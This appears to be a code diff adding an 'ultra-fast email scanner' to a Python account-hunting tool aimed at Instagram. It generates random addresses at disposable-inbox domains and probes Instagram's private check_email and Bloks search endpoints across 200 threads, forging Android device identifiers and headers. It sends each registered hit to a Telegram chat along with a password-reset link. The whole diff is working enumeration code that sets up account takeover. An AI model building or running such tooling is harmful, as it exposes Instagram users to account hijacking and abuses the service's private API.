@@ -93,9 +93,9 @@ def close_all_sessions():
         _active_sessions.clear()
 
 def force_stop():
-    """Immediately shut down M2 thread pools and mark state as stopped."""
+    """Immediately shut down M2/M3 thread pools and mark state as stopped."""
     _web_state['running'] = False
-    for pool_name in ('_m2_disc_pool', '_m2_lookup_pool'):
+    for pool_name in ('_m2_disc_pool', '_m2_lookup_pool', '_m3_pool'):
         pool = globals().get(pool_name)
         if pool is not None:
             try:
@@ -1717,6 +1717,296 @@ def run_method2_web(token, chat_id, min_followers, stop_event):
     finally:
         _m2_disc_pool   = None
         _m2_lookup_pool = None
+        _web_state['running'] = False
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER
+# ══════════════════════════════════════════════════════════════════════════════
+
+_m3_hits         = 0
+_m3_good_insta   = 0
+_m3_bad_insta    = 0
+_m3_bad_email    = 0
+_m3_taken        = 0
+_m3_limit        = 0
+_m3_total        = 0
+_m3_scanned      = 0
+_m3_found_emails: list = []
+_m3_found_lock   = Lock()
+_m3_hit_lock     = Lock()
+_m3_pool: ThreadPoolExecutor = None
+_m3_used_emails  = set()
+_m3_used_lock    = Lock()
+
+_M3_DOMAINS = ["@hi2.in", "@telegmail.com", "@mail.com", "@yopmail.com"]
+
+def _m3_generate_android_ua():
+    devices = [
+        {"brand": "samsung",  "model": "SM-G973F",    "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
+        {"brand": "samsung",  "model": "SM-A536B",    "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
+        {"brand": "samsung",  "model": "SM-S918B",    "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
+        {"brand": "Google",   "model": "Pixel 6",     "device": "raven",    "board": "raven",      "cpu": "gs101"},
+        {"brand": "Google",   "model": "Pixel 7",     "device": "panther",  "board": "panther",    "cpu": "gs201"},
+        {"brand": "Xiaomi",   "model": "M2102J20SG",  "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
+        {"brand": "Xiaomi",   "model": "Redmi Note 10","device": "sweet",   "board": "sm6150",     "cpu": "qcom"},
+        {"brand": "OnePlus",  "model": "ONEPLUS A6003","device": "OnePlus6","board": "sdm845",     "cpu": "qcom"},
+        {"brand": "OPPO",     "model": "CPH2371",     "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
+        {"brand": "HUAWEI",   "model": "ELE-L29",     "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
+    ]
+    device         = random.choice(devices)
+    android_ver    = random.choice(["10", "11", "12", "13", "14"])
+    api_level      = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
+    dpi            = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
+    width          = random.choice(["720", "1080", "1440"])
+    height         = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
+    ig_ver         = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
+    locale         = random.choice(["en_US", "en_GB", "ar_SA"])
+    rnd_num        = random.randint(300000000, 400000000)
+    return (
+        f"Instagram {ig_ver} Android ({api_level}/{android_ver}; "
+        f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
+        f"{device['device']}; {device['board']}; {locale}; {rnd_num})"
+    )
+
+
+def _m3_check_v1(email, client):
+    """V1: Direct Instagram check_email endpoint — fastest."""
+    url = "https://i.instagram.com/api/v1/users/check_email/"
+    headers = {
+        'User-Agent': _m3_generate_android_ua(),
+        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
+        'x-ig-app-id': "567067343352427",
+        'accept-language': "en-IN, en-US",
+    }
+    try:
+        resp = client.post(url, data=f"email={email}", headers=headers, timeout=10)
+        if 'email_is_taken' in resp.text:
+            return "registered"
+        elif 'available' in resp.text.lower() or 'Email' in resp.text:
+            return "not_registered"
+        return "check_v2"
+    except Exception:
+        return "check_v2"
+
+
+def _m3_check_v2(email, client):
+    """V2: Bloks/CAA search endpoint — fallback."""
+    android = "android-" + secrets.token_hex(8)
+    device  = str(uuid.uuid4())
+    family  = str(uuid.uuid4())
+    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
+    params_obj = {
+        "client_input_params": {
+            "aac": json.dumps({
+                "aac_init_timestamp": int(time.time()),
+                "aacjid": str(uuid.uuid4()),
+                "aaccs": secrets.token_urlsafe(32)
+            }, separators=(',', ':')),
+            "flash_call_permissions_status": {
+                "READ_PHONE_STATE": "PERMANENTLY_DENIED",
+                "READ_CALL_LOG": "DENIED",
+                "ANSWER_PHONE_CALLS": "DENIED"
+            },
+            "was_headers_prefill_available": 0,
+            "network_bssid": None,
+            "sfdid": "",
+            "fetched_email_token_list": {},
+            "search_query": email,
+            "auth_secure_device_id": "",
+            "ig_oauth_token": [],
+            "cloud_trust_token": None,
+            "was_headers_prefill_used": 0,
+            "sso_accounts_auth_data": [],
+            "encrypted_msisdn": "",
+            "device_network_info": None,
+            "text_input_id": "akyuf0:61",
+            "zero_balance_state": None,
+            "android_build_type": "release",
+            "accounts_list": [],
+            "is_oauth_without_permission": 0,
+            "ig_android_qe_device_id": device,
+            "gms_incoming_call_retriever_eligibility": "client_not_supported",
+            "search_screen_type": "email_or_username",
+            "is_whatsapp_installed": 1,
+            "lois_settings": {"lois_token": ""},
+            "ig_vetted_device_nonce": None,
+            "headers_infra_flow_id": "",
+            "fetched_email_list": []
+        },
+        "server_params": {
+            "event_request_id": str(uuid.uuid4()),
+            "is_from_logged_out": 0,
+            "layered_homepage_experiment_group": None,
+            "device_id": android,
+            "login_surface": "login_home",
+            "waterfall_id": str(uuid.uuid4()),
+            "INTERNAL__latency_qpl_instance_id": 6.3987980400102e13,
+            "is_platform_login": 0,
+            "context_data": "",
+            "login_entry_point": "logged_out",
+            "INTERNAL__latency_qpl_marker_id": 36707139,
+            "family_device_id": family,
+            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
+            "access_flow_version": "pre_mt_behavior",
+            "is_from_logged_in_switcher": 0,
+            "qe_device_id": device
+        }
+    }
+    payload = {
+        'params': json.dumps(params_obj, separators=(',', ':')),
+        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
+        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+    }
+    tz_offset = str(int(datetime.now().astimezone().utcoffset().total_seconds()))
+    headers = {
+        'User-Agent': _m3_generate_android_ua(),
+        'accept-language': "en-IN, en-US",
+        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+        'x-ig-android-id': android,
+        'x-ig-app-id': "567067343352427",
+        'x-ig-app-locale': "en_IN",
+        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+        'x-ig-device-id': device,
+        'x-ig-family-device-id': family,
+        'x-ig-timezone-offset': tz_offset,
+        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
+        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
+    }
+    try:
+        resp = client.post(url, data=payload, headers=headers, timeout=10)
+        if email in resp.text:
+            return "registered"
+        return "not_registered"
+    except Exception:
+        return "unknown"
+
+
+def _m3_save_hit(token, chat_id, email, method_label="V1"):
+    global _m3_hits, _m3_total
+    domain  = email.split('@')[1]
+    prefix  = email.split('@')[0]
+    masked  = f"{prefix[0]}{'*' * max(len(prefix) - 2, 1)}{prefix[-1]}@{domain}"
+
+    with _m3_hit_lock:
+        _m3_hits  += 1
+        _m3_total += 1
+        hit_num    = _m3_hits
+
+    msg = (
+        f"\n\nWEYN M3 — EMAIL SCANNER\n"
+        f"HIT #{hit_num}\n"
+        f"EMAIL  : {email}\n"
+        f"MASKED : {masked}\n"
+        f"STATUS : REGISTERED ({method_label})\n"
+        f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
+        f"_______________________________________\n"
+        f"BY ~ @jinbelowg @weyn_vouches"
+    )
+
+    _save_hit_to_file(msg)
+
+    entry = json.dumps({"e": email, "m": method_label})
+    with _m3_found_lock:
+        _m3_found_emails.append(entry)
+        if len(_m3_found_emails) > 200:
+            _m3_found_emails.pop(0)
+
+    _web_state['hits']        = _m3_hits
+    _web_state['total']       = _m3_total
+    _web_state['recent_hits'] = list(_m3_found_emails[-20:])
+
+    _send_telegram(token, chat_id, msg)
+
+
+def _m3_worker(token, chat_id, stop_event):
+    global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned
+
+    while not (stop_event and stop_event.is_set()):
+        try:
+            user1 = ''.join(random.choices(string.ascii_lowercase, k=6))
+            user2 = ''.join(random.choices(string.ascii_lowercase, k=6))
+            chosen = random.choice([user1, user2])
+
+            with _m3_used_lock:
+                if chosen in _m3_used_emails:
+                    continue
+                _m3_used_emails.add(chosen)
+
+            domain = random.choice(_M3_DOMAINS)
+            email  = chosen + domain
+
+            _m3_scanned += 1
+            _web_state['scanned'] = _m3_scanned
+
+            try:
+                with httpx.Client(http2=True, timeout=15) as client:
+                    result_v1 = _m3_check_v1(email, client)
+
+                    if result_v1 == "registered":
+                        _m3_good_insta += 1
+                        _web_state['good'] = _m3_good_insta
+                        _m3_save_hit(token, chat_id, email, "V1")
+
+                    elif result_v1 == "check_v2":
+                        result_v2 = _m3_check_v2(email, client)
+                        if result_v2 == "registered":
+                            _m3_good_insta += 1
+                            _web_state['good'] = _m3_good_insta
+                            _m3_save_hit(token, chat_id, email, "V2")
+                        elif result_v2 == "unknown":
+                            _m3_bad_email += 1
+                            _web_state['bad_email'] = _m3_bad_email
+                        else:
+                            _m3_bad_insta += 1
+                            _web_state['bad_insta'] = _m3_bad_insta
+                    else:
+                        _m3_bad_insta += 1
+                        _web_state['bad_insta'] = _m3_bad_insta
+
+            except Exception:
+                _m3_bad_insta += 1
+                _web_state['bad_insta'] = _m3_bad_insta
+
+        except Exception:
+            time.sleep(0.05)
+            continue
+
+
+def run_method3_web(token, chat_id, stop_event):
+    global _m3_hits, _m3_good_insta, _m3_bad_insta, _m3_bad_email
+    global _m3_taken, _m3_limit, _m3_total, _m3_scanned
+    global _m3_found_emails, _m3_pool, _m3_used_emails
+
+    _m3_hits = _m3_good_insta = _m3_bad_insta = _m3_bad_email = 0
+    _m3_taken = _m3_limit = _m3_total = _m3_scanned = 0
+    _m3_found_emails = []
+    _m3_used_emails  = set()
+
+    _write_session_separator(3)
+    _web_state.update({
+        'running': True, 'method': '3',
+        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
+        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
+        'recent_hits': [], 'tg_status': '', 'tg_error': '',
+    })
+
+    NUM_WORKERS = 200
+    try:
+        pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
+        _m3_pool = pool
+        futures = [
+            pool.submit(_m3_worker, token, chat_id, stop_event)
+            for _ in range(NUM_WORKERS)
+        ]
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception:
+                pass
+    finally:
+        _m3_pool = None
         _web_state['running'] = False
 
 
